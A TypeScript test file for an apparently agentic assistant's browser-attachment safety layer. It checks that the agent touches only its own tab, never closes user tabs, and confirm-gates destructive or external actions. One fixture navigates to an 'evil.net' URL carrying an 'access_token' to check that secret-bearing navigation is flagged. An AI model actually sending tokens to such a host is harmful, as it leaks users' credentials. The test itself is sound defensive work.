/**
 * Copyright (c) 2026 Shiva Deore (Taracod).
 * Licensed under AGPL-3.0. See LICENSE for details.
 *
 * Aiden — local-first agent.
 */
/**
 * v4.12 B3.1 / B3.2a — attach-don't-own (CDP): safety scaffolding + controlled
 * actions (act only on Aiden's tab; committing/external actions confirm-gated).
 *
 * The non-negotiable property: when attached to the USER'S real Chrome, Aiden
 * NEVER closes their tabs/browser and NEVER grabs a user tab — it controls only
 * a dedicated tab it creates, and detach/pwClose DISCONNECT (never close).
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

const h = vi.hoisted(() => {
  const aidenPages: any[] = [];
  const pageListeners: Array<(p: any) => void> = []; // context.on('page') subscribers
  let stuckClick = false; // B3.2b — when true, a click hangs until the page is closed
  const makePage = (url: string) => {
    let closed = false; let _url = url; let rejectOnClose: (() => void) | null = null;
    let _opener: any = null;
    const closeListeners: Array<() => void> = [];
    const hangUntilClosed = () => new Promise((_res, rej) => {
      rejectOnClose = () => rej(new Error('Target page, context or browser has been closed'));
    });
    const loc = {
      first: () => loc, count: vi.fn(async () => 1), fill: vi.fn(async () => {}),
      click: vi.fn(() => (stuckClick ? hangUntilClosed() : Promise.resolve())),
    };
    return {
      url: () => _url, isClosed: () => closed, title: vi.fn(async () => 'T'),
      opener: vi.fn(async () => _opener),
      __setOpener: (p: any) => { _opener = p; },
      on: vi.fn((evt: string, cb: () => void) => { if (evt === 'close') closeListeners.push(cb); }),
      close: vi.fn(async () => { closed = true; if (rejectOnClose) rejectOnClose(); closeListeners.forEach((c) => c()); }),
      goto: vi.fn(async (u: string) => { _url = u; }),
      click: vi.fn(async () => {}), fill: vi.fn(async () => {}),
      waitForSelector: vi.fn(async () => {}), waitForLoadState: vi.fn(async () => {}),
      waitForURL: vi.fn(async () => {}), evaluate: vi.fn(async () => {}),
      locator: vi.fn(() => loc), getByRole: vi.fn(() => loc),
    };
  };
  // The user's REAL tabs — must never be touched.
  const userTab1 = makePage('https://mail.example.com/inbox');
  const userTab2 = makePage('https://news.example.com/');
  const userContext = {
    pages: () => [userTab1, userTab2],
    newPage: vi.fn(async () => { const p = makePage('about:blank'); aidenPages.push(p); return p; }),
    on: vi.fn((evt: string, cb: (p: any) => void) => { if (evt === 'page') pageListeners.push(cb); }),
    close: vi.fn(async () => {}), // MUST NOT be called while attached
  };
  const cdpBrowser = {
    contexts: () => [userContext],
    newContext: vi.fn(async () => userContext),
    close: vi.fn(async () => {}), // CDP close = DISCONNECT, not terminate
  };
  const ownedContext = {
    pages: () => [makePage('about:blank')],
    newPage: vi.fn(async () => makePage('about:blank')),
    on: vi.fn(),
    close: vi.fn(async () => {}),
  };
  const chromium = {
    connectOverCDP: vi.fn(async () => cdpBrowser),
    launchPersistentContext: vi.fn(async () => ownedContext),
  };
  return {
    chromium, cdpBrowser, userContext, userTab1, userTab2, aidenPages, makePage,
    setStuck: (v: boolean) => { stuckClick = v; },
    // simulate context.on('page') firing for a newly-opened popup/user tab
    emitPage: async (p: any) => { for (const cb of pageListeners) cb(p); await new Promise((r) => setTimeout(r, 0)); },
  };
});
vi.mock('playwright', () => ({ chromium: h.chromium }));

import {
  pwAttach, pwDetach, pwStop, pwBrowserStatus, pwClose, pwGetUrl, pwAcquire,
  pwNavigate, pwClick, pwClickFirstResult, pwType, pwScroll, pwActByLease,
  assertControlledTab,
  pwListTabs, pwSwitchControl, pwOpenTab, pwCloseTab,
} from '../../../core/playwrightBridge';
import { getTabRegistry } from '../../../core/v4/browser/tabRegistry';
import { browser } from '../../../cli/v4/commands/browser';
import { ToolRegistry, type ToolHandler, type ToolContext } from '../../../core/v4/toolRegistry';
import { ApprovalEngine } from '../../../moat/approvalEngine';
import { getLeaseStore, type AxRawDescriptor } from '../../../core/v4/browserState';
import { reResolveAndRetry } from '../../../tools/v4/browser/reResolve';

const EP = 'http://127.0.0.1:9222';

beforeEach(() => { vi.clearAllMocks(); });
afterEach(async () => { h.setStuck(false); await pwDetach(); }); // reset to owned

describe('mode switch', () => {
  it('defaults to owned', () => {
    expect(pwBrowserStatus().mode).toBe('owned');
  });
  it('attaches via connectOverCDP to the user endpoint', async () => {
    const r = await pwAttach(EP);
    expect(r.ok).toBe(true);
    expect(h.chromium.connectOverCDP).toHaveBeenCalledWith(EP);
    const s = pwBrowserStatus();
    expect(s.mode).toBe('attached');
    expect(s.endpoint).toBe(EP);
  });
});

describe('dedicated controlled tab — never grabs a user tab', () => {
  it('creates its OWN tab (about:blank), leaves the user tabs untouched', async () => {
    await pwAttach(EP);
    expect(h.userContext.newPage).toHaveBeenCalledTimes(1);       // Aiden made one tab
    expect(pwBrowserStatus().controlledTabUrl).toBe('about:blank'); // not mail/news
    expect(h.userTab1.close).not.toHaveBeenCalled();
    expect(h.userTab2.close).not.toHaveBeenCalled();
  });
});

describe('read-only tools still work in attached mode', () => {
  it('get_url works', async () => {
    await pwAttach(EP);
    const r = await pwGetUrl();
    expect(r.ok).toBe(true);
    expect(r.url).toBe('about:blank');
  });
});

// ── B3.2a — actions enabled, controlled-tab ONLY ─────────────────────────────

describe('B3.2a — actions run on Aiden\'s controlled tab ONLY (never a user tab)', () => {
  it('pwNavigate targets the controlled tab, never scans/touches user pages', async () => {
    await pwAttach(EP);
    const aidenTab = h.aidenPages.at(-1);
    const r = await pwNavigate('https://example.com/page');
    expect(r.ok).toBe(true);
    expect(aidenTab.goto).toHaveBeenCalledWith('https://example.com/page', expect.anything());
    expect(h.userTab1.goto).not.toHaveBeenCalled(); // user pages never navigated
    expect(h.userTab2.goto).not.toHaveBeenCalled();
  });
  it('all six action fns act only on the controlled tab, never user pages', async () => {
    await pwAttach(EP);
    await pwNavigate('https://example.com/');
    await pwClick('#b');
    await pwType('#i', 'hello');
    await pwScroll('down', 1);
    await pwClickFirstResult();
    await pwActByLease({ frame_id: 'main', role: 'button', name: 'Go' } as never, { kind: 'click' });
    // user tabs were never clicked / filled / navigated
    for (const t of [h.userTab1, h.userTab2]) {
      expect(t.goto).not.toHaveBeenCalled();
      expect(t.click).not.toHaveBeenCalled();
      expect(t.fill).not.toHaveBeenCalled();
    }
  });
});

describe('assertControlledTab — refuses if targeting ever drifts off the controlled tab', () => {
  it('owned mode: any page passes', () => {
    expect(() => assertControlledTab(h.userTab1)).not.toThrow();
  });
  it('attached mode: only the controlled tab passes; a user tab is refused', async () => {
    await pwAttach(EP);
    const aidenTab = h.aidenPages.at(-1);
    expect(() => assertControlledTab(aidenTab)).not.toThrow();
    expect(() => assertControlledTab(h.userTab1)).toThrow(/not Aiden's controlled tab/i);
  });
});

describe('★ never-close-user-tabs', () => {
  it('detach DISCONNECTS (cdp close) + closes ONLY Aiden\'s tab, never user state', async () => {
    await pwAttach(EP);
    const aidenTab = h.aidenPages.at(-1);
    await pwDetach();
    expect(h.cdpBrowser.close).toHaveBeenCalledTimes(1); // disconnect
    expect(h.userContext.close).not.toHaveBeenCalled();  // never close user context
    expect(h.userTab1.close).not.toHaveBeenCalled();
    expect(h.userTab2.close).not.toHaveBeenCalled();
    expect(aidenTab.close).toHaveBeenCalledTimes(1);     // only Aiden's own tab
    expect(pwBrowserStatus().mode).toBe('owned');
  });
  it('pwClose (shutdown/SIGINT) DETACHES when attached — never closes the user\'s Chrome', async () => {
    await pwAttach(EP);
    await pwClose();
    expect(h.cdpBrowser.close).toHaveBeenCalledTimes(1);
    expect(h.userContext.close).not.toHaveBeenCalled();
    expect(pwBrowserStatus().mode).toBe('owned');
  });
});

// ── /browser command ─────────────────────────────────────────────────────────

function fakeCtx(args: string[], confirmReturn = true) {
  const lines: string[] = [];
  const ctx = {
    args,
    display: {
      info: (m: string) => lines.push('INFO ' + m),
      warn: (m: string) => lines.push('WARN ' + m),
      success: (m: string) => lines.push('OK ' + m),
      printError: (m: string) => lines.push('ERR ' + m),
      write: (m: string) => lines.push(m),
    },
    confirm: async () => confirmReturn,
  } as never;
  return { ctx, text: () => lines.join('\n') };
}

describe('/browser command', () => {
  it('attach prints the blunt security warning + consent, then attaches on confirm', async () => {
    const { ctx, text } = fakeCtx(['attach'], true);
    await browser.handler!(ctx);
    expect(text()).toMatch(/high-stakes/i);
    expect(text()).toMatch(/committing or external action.*confirm-gated|confirm-gated/i);
    expect(text()).toMatch(/only on its OWN tab/i);
    expect(text()).toMatch(/dedicated debugging profile/i);
    expect(text()).toMatch(/Attached to/);
    expect(pwBrowserStatus().mode).toBe('attached');
  });
  it('declining the confirm does NOT attach', async () => {
    const { ctx, text } = fakeCtx(['attach'], false);
    await browser.handler!(ctx);
    expect(text()).toMatch(/cancelled/i);
    expect(pwBrowserStatus().mode).toBe('owned');
  });
  it('detach is the kill switch — disconnects cleanly', async () => {
    await pwAttach(EP);
    const { ctx, text } = fakeCtx(['detach']);
    await browser.handler!(ctx);
    expect(text()).toMatch(/Detached/);
    expect(pwBrowserStatus().mode).toBe('owned');
  });
  it('status reports the current mode', async () => {
    const { ctx, text } = fakeCtx(['status']);
    await browser.handler!(ctx);
    expect(text()).toMatch(/Browser mode: owned/);
  });
});

// ── B3.2a — B5 guards fire in ATTACHED mode (executor-level, tested not asserted) ──

function desc(over: Partial<AxRawDescriptor> = {}): AxRawDescriptor {
  return {
    tag: 'button', roleAttr: '', inputType: '', ariaLabel: '', labelledByText: '',
    textContent: '', placeholder: '', alt: '', title: '',
    css_path: '#x', bbox: { x: 0, y: 0, w: 1, h: 1 }, frame_id: 'main', submit: false, ...over,
  };
}
const stub = (name: string): ToolHandler => ({
  schema: { name, description: 'x', inputSchema: { type: 'object', properties: {} } },
  category: 'browser', mutates: true, toolset: 'browser',
  async execute() { return { success: true }; },
});
const baseCtx = (): ToolContext => ({ cwd: process.cwd(), paths: { authJson: '/tmp/x' } as never } as ToolContext);

async function tierFor(call: { name: string; arguments: Record<string, unknown> }): Promise<string | undefined> {
  const captured: { tier?: string } = {};
  const engine = new ApprovalEngine('smart', {
    riskAssess: async () => ({ tier: 'safe', rationale: 'untouched' }),
    onDecision: (req) => { captured.tier = req.riskTier; },
  });
  const reg = new ToolRegistry();
  reg.register(stub(call.name));
  const exec = reg.buildExecutor({ ...baseCtx(), approvalEngine: engine });
  await exec({ id: '1', ...call });
  return captured.tier;
}

describe('B3.2a — confirm-destructive (B5.2) fires in ATTACHED mode', () => {
  it('a destructive click on the REAL browser → dangerous at the gate (before acting)', async () => {
    await pwAttach(EP);
    getLeaseStore().refresh(1, 'u', [desc({ ariaLabel: 'Place order', submit: true })]); // @e1
    expect(await tierFor({ name: 'browser_click', arguments: { ref: '@e1' } })).toBe('dangerous');
  });
});

describe('B3.2a — nav-guard (B5.3) + conservative external-nav default in ATTACHED mode', () => {
  it('attached: ANY external navigation → dangerous (even WITHOUT a secret)', async () => {
    await pwAttach(EP);
    expect(await tierFor({ name: 'browser_navigate', arguments: { url: 'https://example.com/docs' } })).toBe('dangerous');
  });
  it('attached: a LOCAL URL is still never flagged (dev stays legitimate)', async () => {
    await pwAttach(EP);
    expect(await tierFor({ name: 'browser_navigate', arguments: { url: 'http://localhost:3000/app' } })).not.toBe('dangerous');
  });
  it('OWNED mode is UNCHANGED: external non-secret nav is NOT flagged', async () => {
    expect(pwBrowserStatus().mode).toBe('owned');
    expect(await tierFor({ name: 'browser_navigate', arguments: { url: 'https://example.com/docs' } })).not.toBe('dangerous');
  });
  it('attached: external SECRET-bearing nav → dangerous (B5.3 still applies)', async () => {
    await pwAttach(EP);
    expect(await tierFor({ name: 'browser_navigate', arguments: { url: 'https://evil.net/?access_token=stolen123' } })).toBe('dangerous');
  });
});

// ── B3.2b — abort-mid-action + concurrent-use hardening ──────────────────────

describe('B3.2b — abort-mid-action via tab-close (interrupt primitive)', () => {
  it('★ /browser stop interrupts an in-flight action in ≪ timeout + frees the mutex (no deadlock)', async () => {
    await pwAttach(EP);
    h.setStuck(true); // the next click hangs until its page is closed
    let settled = false;
    const inflight = pwActByLease({ frame_id: 'main', role: 'button', name: 'Go' } as never, { kind: 'click' })
      .then((r) => { settled = true; return r; });
    await new Promise((r) => setTimeout(r, 30)); // let it acquire the mutex + reach the hung click
    expect(settled).toBe(false);                  // still stuck (would hang to the 5s timeout)

    await pwStop();                               // closes the controlled tab → pending click rejects
    // resolves via the tab-close rejection, NOT the 5s playwright timeout:
    const r = await Promise.race([inflight, new Promise<{ ok: unknown }>((res) => setTimeout(() => res({ ok: 'TIMEOUT' }), 1500))]);
    expect(settled).toBe(true);
    expect(r.ok).toBe(false);                     // not 'TIMEOUT' → interrupted in ≪ 5s
    expect((r as { error?: string }).error).toMatch(/closed/i);

    // mutex was freed → a fresh acquire resolves immediately (no deadlock):
    const rel = await pwAcquire(); rel();
    expect(true).toBe(true);
  });

  it('stop STAYS attached + recreates a fresh controlled tab', async () => {
    await pwAttach(EP);
    const before = h.aidenPages.length;
    await pwStop();
    expect(pwBrowserStatus().mode).toBe('attached');          // still attached
    expect(h.aidenPages.length).toBe(before + 1);             // a fresh tab was created
    expect(pwBrowserStatus().controlledTabUrl).toBe('about:blank');
  });

  it('stop while NOT attached is a no-op', async () => {
    expect((await pwStop()).stopped).toBe(false);
  });

  it('detach interrupts AND disconnects (closes Aiden tab, never user tabs)', async () => {
    await pwAttach(EP);
    h.setStuck(true);
    const inflight = pwActByLease({ frame_id: 'main', role: 'button', name: 'Go' } as never, { kind: 'click' });
    await new Promise((r) => setTimeout(r, 30)); // let it reach the hung click
    await pwDetach();
    const r = await Promise.race([inflight, new Promise<{ ok: unknown }>((res) => setTimeout(() => res({ ok: 'TIMEOUT' }), 1500))]);
    expect(r.ok).toBe(false);                     // interrupted in ≪ 5s, not timed out
    expect((r as { error?: string }).error).toMatch(/closed/i);
    expect(pwBrowserStatus().mode).toBe('owned');             // disconnected
    expect(h.cdpBrowser.close).toHaveBeenCalled();
    expect(h.userTab1.close).not.toHaveBeenCalled();
    expect(h.userTab2.close).not.toHaveBeenCalled();
  });
});

describe('B3.2b — uniform mutex: all six action fns serialize', () => {
  it('every action fn acquires the mutex (one runs at a time)', async () => {
    await pwAttach(EP);
    // Hold the mutex, then fire each action — none should complete until released.
    const release = await pwAcquire();
    const calls = [
      pwNavigate('http://localhost/x'), pwClick('#a'), pwClickFirstResult(),
      pwType('#i', 'x'), pwScroll('down', 1),
      pwActByLease({ frame_id: 'main', role: 'button', name: 'Go' } as never, { kind: 'click' }),
    ];
    let anyDone = false;
    void Promise.race(calls).then(() => { anyDone = true; });
    await new Promise((r) => setTimeout(r, 20));
    expect(anyDone).toBe(false);   // all six are blocked behind the held mutex
    release();
    await Promise.all(calls);      // all drain once released → no deadlock
    expect(true).toBe(true);
  });
});

describe('B3.2b — concurrent-use', () => {
  it('other-tab isolation: actions never touch the user tabs', async () => {
    await pwAttach(EP);
    await pwNavigate('http://localhost/x');
    await pwClick('#a');
    await pwType('#i', 'hi');
    for (const t of [h.userTab1, h.userTab2]) {
      expect(t.goto).not.toHaveBeenCalled();
      expect(t.click).not.toHaveBeenCalled();
      expect(t.fill).not.toHaveBeenCalled();
      expect(t.close).not.toHaveBeenCalled();
    }
  });

  it('lease-drift (reResolveAndRetry) fires in ATTACHED mode via the real act path', async () => {
    await pwAttach(EP);
    expect(pwBrowserStatus().mode).toBe('attached');
    getLeaseStore().refresh(1, 'u', [desc({ ariaLabel: 'Next page' })]); // @e1 — non-destructive
    const rr = await reResolveAndRetry({
      ref: '@e1', actionKind: 'click', staleReason: 'not visible', state_delta: [],
      // inject the re-snapshot; the RETRY uses the real pwActByLease (default actFn)
      // → exercises the attached controlled-tab act path.
      snapshotFn: async () => ({ ok: true, url: 'u', elements: [desc({ ariaLabel: 'Next page' })] as never }),
    });
    expect(rr.sidecar.attempted).toBe(true);
    expect(rr.sidecar.succeeded).toBe(true); // real pwActByLease acted on the controlled tab
  });
});

// ── B4.1 — first-class tab registry + multi-tab safety policy ─────────────────

describe('B4.1 — tab registry: live classification (createdBy)', () => {
  it('seeds existing pages as USER and Aiden\'s controlled tab as AIDEN', async () => {
    await pwAttach(EP);
    const r = await pwListTabs();
    expect(r.ok).toBe(true);
    const user = r.tabs.filter((t) => t.createdBy === 'user');
    const aiden = r.tabs.filter((t) => t.createdBy === 'aiden');
    expect(user.length).toBe(2);        // the two pre-existing user tabs
    expect(aiden.length).toBe(1);       // Aiden's dedicated controlled tab
    expect(aiden[0].controlled).toBe(true);
  });

  it('an opener-rooted popup (window.open from Aiden\'s tab) classifies as AIDEN', async () => {
    await pwAttach(EP);
    const aidenTab = h.aidenPages.at(-1);            // Aiden's controlled tab
    const popup = h.makePage('https://accounts.example.com/oauth');
    popup.__setOpener(aidenTab);                     // opener roots at an Aiden tab
    await h.emitPage(popup);                         // context.on('page') fires live
    const meta = getTabRegistry().get(popup);
    expect(meta?.createdBy).toBe('aiden');           // OAuth popup is Aiden-controllable
  });

  it('a user-opened tab (no Aiden-rooted opener) classifies as USER', async () => {
    await pwAttach(EP);
    const userTab = h.makePage('https://random.example.com/');
    await h.emitPage(userTab);                       // no opener set → user
    expect(getTabRegistry().get(userTab)?.createdBy).toBe('user');
  });
});

describe('B4.1 — ★ multi-tab safety policy', () => {
  it('opener-rooted popup is controllable AND closeable', async () => {
    await pwAttach(EP);
    const popup = h.makePage('https://accounts.example.com/oauth');
    popup.__setOpener(h.aidenPages.at(-1));
    await h.emitPage(popup);
    const id = getTabRegistry().idOf(popup)!;
    expect((await pwSwitchControl(id)).ok).toBe(true); // Aiden controls its own popup freely
    expect((await pwCloseTab(id)).ok).toBe(true);       // and may close it
  });

  it('user tab is listable but close is REFUSED', async () => {
    await pwAttach(EP);
    const userId = (await pwListTabs()).tabs.find((t) => t.createdBy === 'user')!.tab_id;
    const r = await pwCloseTab(userId);
    expect(r.ok).toBe(false);
    expect(r.error).toMatch(/your tabs|only closes tabs it opened/i);
  });

  it('Aiden CANNOT unilaterally control a user tab (tier-2 designation required)', async () => {
    await pwAttach(EP);
    const userId = (await pwListTabs()).tabs.find((t) => t.createdBy === 'user')!.tab_id;
    const blocked = await pwSwitchControl(userId);                 // no designation
    expect(blocked.ok).toBe(false);
    expect(blocked.error).toMatch(/your tabs|designate it explicitly/i);
    const allowed = await pwSwitchControl(userId, { userDesignated: true }); // tier-2
    expect(allowed.ok).toBe(true);
  });

  it('a user tab stays NON-closeable even after being designated + controlled', async () => {
    await pwAttach(EP);
    const userId = (await pwListTabs()).tabs.find((t) => t.createdBy === 'user')!.tab_id;
    await pwSwitchControl(userId, { userDesignated: true });        // now controlled
    expect(pwBrowserStatus().controlledTabUrl).toBeTruthy();
    const r = await pwCloseTab(userId);
    expect(r.ok).toBe(false);                                       // close still refused
    const userPage = getTabRegistry().pageById(userId) as any;
    expect(userPage.close).not.toHaveBeenCalled();                 // never even attempted
  });

  it('assertControlledTab passes on the designated tab', async () => {
    await pwAttach(EP);
    const userId = (await pwListTabs()).tabs.find((t) => t.createdBy === 'user')!.tab_id;
    await pwSwitchControl(userId, { userDesignated: true });
    const userPage = getTabRegistry().pageById(userId) as any;
    expect(() => assertControlledTab(userPage)).not.toThrow();      // it's now THE controlled tab
    expect(() => assertControlledTab(h.userTab2)).toThrow();        // a different user tab is refused
  });

  it('pwOpenTab creates an Aiden-created (controllable + closeable) tab', async () => {
    await pwAttach(EP);
    const o = await pwOpenTab('https://example.com/');
    expect(o.ok).toBe(true);
    expect(getTabRegistry().get(getTabRegistry().pageById(o.tab_id!))?.createdBy).toBe('aiden');
    expect((await pwCloseTab(o.tab_id!)).ok).toBe(true);
  });
});

describe('B4.1 — /browser tabs + control commands', () => {
  it('/browser tabs lists tabs with createdBy + controlled flags', async () => {
    await pwAttach(EP);
    const { ctx, text } = fakeCtx(['tabs']);
    await browser.handler!(ctx);
    expect(text()).toMatch(/aiden, controlled/);
    expect(text()).toMatch(/user.*not closeable/);
  });

  it('/browser control <id> designates + controls a user tab (confirm-gated)', async () => {
    await pwAttach(EP);
    const userId = (await pwListTabs()).tabs.find((t) => t.createdBy === 'user')!.tab_id;
    const { ctx, text } = fakeCtx(['control', userId], true);
    await browser.handler!(ctx);
    expect(text()).toMatch(/Now controlling/);
  });
});
